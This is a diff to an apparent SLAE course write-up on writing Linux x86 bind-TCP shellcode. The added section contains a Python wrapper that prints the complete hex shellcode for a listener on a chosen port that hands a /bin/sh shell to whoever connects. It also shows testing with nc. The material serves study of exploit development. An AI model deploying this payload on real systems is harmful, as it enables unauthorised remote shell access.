@@ -25,7 +25,7 @@ Student ID: SLAE-824
 
 ## Requirements<a id="sec-1-1" name="sec-1-1"></a>
 
--   Create a Shell<sub>Bind</sub><sub>TCP</sub> shellcode
+-   Create a Shell Bind TCP shellcode
     -   Bind to a port
     -   Execs Shell on incoming connection
 -   Port number should be easily configurable
@@ -260,7 +260,7 @@ Lets lookup some values of constants:
 
     #define AF_INET   2 /* Internet IP Protocol   */
 
-I had a hard time finding where SOCK<sub>STREAM</sub> was defined so we use
+I had a hard time finding where `SOCK_STREAM` was defined so we use
 a little gcc magic to see what the macro expands to:
 
     root@blahblah:~/shared/SLAE/slae/exercise1# gcc -DN -E bindshell.c | grep SOCK_STREAM
@@ -272,7 +272,7 @@ a little gcc magic to see what the macro expands to:
     global _start
     ;; Note: We will store 2 file descriptors along the way
     ;; We will put the listening socket file descriptor in edi
-    ;; We will put the connection socket file descriptor in esi
+    ;; We will put the connection socket file descriptor in ebx
     
     section .text
       _start:
@@ -451,5 +451,42 @@ Compile with: `gcc shellcode.c -o shellcode`
 Run with: `./shellcode`
 Connect with: `nc -nv 127.0.0.1 4444`
 
-And it works! We get our shell. The shellcode is 122 bytes without really
-trying to optimize. We can go back and see if we can do better now.
+And it works! We get our shell. The shellcode is 122 bytes without
+really trying to optimize. We can always go back and try to
+optimize. We also need to update the program to make the port number
+easily configurable.
+
+Let's write a wrapper script to set our port. We just accept the port
+as a command line argument to our script and interpolate it into our
+shellcode and print out the result:
+
+    #!/usr/bin/python
+    
+    #!/usr/bin/python
+    
+    import sys
+    
+    if len(sys.argv) != 2:
+      print "Fail!"
+    
+    port_number     = int(sys.argv[1])
+    bts             = [port_number >> i & 0xff for i in (24,16,8,0)]
+    filtered        = [b for b in bts if b > 0]
+    formatted       = ["\\x" + format(b, 'x') for b in filtered]
+    joined          = "".join(formatted)
+    
+    shellcode ="\\x31\\xc0\\xb0\\x66\\x31\\xdb\\xb3\\x01\\x31\\xc9\\x51\\x53\\x6a\\x02\\x89\\xe1"
+    shellcode+="\\xcd\\x80\\x31\\xff\\x89\\xc7\\x31\\xc0\\xb0\\x66\\x31\\xdb\\xb3\\x02\\x31\\xc9"
+    shellcode+="\\x51\\x66\\x68" + joined + "\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x57"
+    shellcode+="\\x89\\xe1\\xcd\\x80\\x31\\xc0\\xb0\\x66\\x31\\xdb\\xb3\\x04\\x31\\xc9\\x51\\x57"
+    shellcode+="\\x89\\xe1\\xcd\\x80\\x31\\xc0\\xb0\\x66\\x31\\xdb\\xb3\\x05\\x31\\xc9\\x51\\x51"
+    shellcode+="\\x57\\x89\\xe1\\xcd\\x80\\x31\\xdb\\x89\\xc3\\x31\\xc9\\xb1\\x02\\xb0\\x3f\\xcd"
+    shellcode+="\\x80\\x49\\x79\\xf9\\x31\\xc0\\xb0\\x0b\\x31\\xdb\\x53\\x68\\x2f\\x2f\\x73\\x68"
+    shellcode+="\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xcd\\x80"
+    
+    print(shellcode)
+
+Once we have our script we print out our updated shellcode and pop it back
+into our shellcode.c stub program, compile and test a connection. When we do,
+we get our shell again. And even better, we can change the port to whatever we
+would like to yield the proper shellcode.
